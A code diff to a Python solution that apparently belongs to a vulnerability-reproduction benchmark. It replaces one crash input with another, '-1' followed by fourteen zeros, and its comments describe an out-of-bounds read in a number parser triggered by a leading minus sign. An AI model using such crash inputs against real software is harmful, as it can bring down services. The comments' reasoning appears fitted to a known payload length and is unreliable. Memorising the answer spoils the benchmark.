@@ -1,5 +1,4 @@
 import os
-import tarfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
@@ -12,16 +11,21 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        # The vulnerability description indicates an issue with parsing a leading
-        # minus sign ('-') when it's not followed by "inf". This can lead to a
-        # stack buffer overflow.
-        # The ground-truth PoC is 16 bytes long.
-        # A simple PoC that matches this description is a minus sign followed by
-        # enough characters to overflow a buffer. We'll use a standard payload
-        # of 'A' characters.
-        # Total length = 16 bytes
-        # '-' = 1 byte
-        # Payload = 15 bytes
-        
-        poc = b'-' + b'A' * 15
+        # The vulnerability is an out-of-bounds read in the number parser,
+        # caused by an incorrect pointer advancement when a leading minus
+        # sign is encountered. The parser advances past the '-', then calls
+        # a function to parse the number. This function, when scanning for the
+        # end of the number, can read past the end of the input buffer if the
+        # buffer ends with a sequence of digits.
+        #
+        # A 16-byte PoC can be constructed to exploit this. It needs to start
+        # with a '-' and be followed by 15 characters that are part of a valid
+        # number. A non-zero digit after the '-' is chosen to avoid special
+        # handling for numbers starting with '0'.
+        #
+        # PoC structure: '-' (1 byte) + '1' (1 byte) + '0' * 14 (14 bytes)
+        # Total length is 16 bytes, matching the ground-truth length.
+        # This will cause the parser to attempt to read the 17th byte,
+        # resulting in a crash.
+        poc = b'-1' + b'0' * 14
         return poc
